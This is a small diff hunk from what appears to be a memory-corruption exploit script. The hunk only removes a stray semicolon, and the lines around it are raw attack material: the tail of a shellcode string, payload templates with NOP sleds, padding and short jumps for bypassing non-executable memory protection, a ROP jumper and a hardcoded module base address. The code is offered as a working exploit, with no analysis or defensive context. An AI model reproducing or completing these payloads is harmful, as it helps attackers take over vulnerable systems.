@@ -72,7 +72,7 @@ shellcode += "\x08\x9e\xe0"
 
 nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
 disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
-ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
+ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01"
 module_base = 0x6f880000
 
 
